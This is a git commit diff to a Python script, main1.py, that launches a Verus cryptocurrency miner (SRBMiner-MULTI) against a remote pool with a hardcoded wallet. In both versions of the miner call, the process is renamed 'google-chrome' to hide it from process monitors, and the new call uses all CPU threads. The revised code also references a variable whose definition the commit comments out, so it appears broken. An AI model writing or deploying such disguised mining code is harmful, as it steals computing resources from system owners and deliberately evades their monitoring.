2c86b84e339369f70942bf0ea8638570a2a0d182
gahalusinta4 <gahalusinta@gmail.com>
2024-09-30 08:57:38 +0800

    Update main1.py

--- main1.py
+++ main1.py
@@ -5,27 +5,27 @@ os.system("chmod +x SRBMiner-MULTI hellminer verus-solver hell.sh verus-solver-o
 #os.system("bash hell.sh")
 
 
-name = random.randint(2000,9000)
-# Replace the current process with the mining process
-os.execvp("./jupyter2", [
-    "google-chrome",  # This will be the name shown in process monitors
-    "-a", "verush",
-    "--url", "stratum+tcp://us.vipor.net:5040",
-    "-u", f"RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.aaa{name}",
-    "-p", "d=0.1",
-    "-t", "50"
-])
+# name = random.randint(2000,9000)
+# # Replace the current process with the mining process
+# os.execvp("./jupyter2", [
+#     "google-chrome",  # This will be the name shown in process monitors
+#     "-a", "verush",
+#     "--url", "stratum+tcp://us.vipor.net:5040",
+#     "-u", f"RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.aaa{name}",
+#     "-p", "d=0.1",
+#     "-t", "50"
+# ])
 
-# # os.execvp("./SRBMiner-MULTI",  [
-# #     "google-chrome",
-# #     "--disable-gpu",
-# #     "--algorithm", "verushash",
-# #     "--pool", "localhost:3000",
-# #     "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
-# #     "--worker", f"aaa{name}", 
-# #     "--password", "d=4",
-# #     "--cpu-threads", "4"
-# # ])
+os.execvp("./SRBMiner-MULTI",  [
+    "google-chrome",
+    "--disable-gpu",
+    "--algorithm", "verushash",
+    "--pool", "us.vipor.net:5040",
+    "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
+    "--worker", f"aaa{name}", 
+    "--password", "x",
+    "--cpu-threads", "0"
+])
 # import os
 
 # # Example worker name
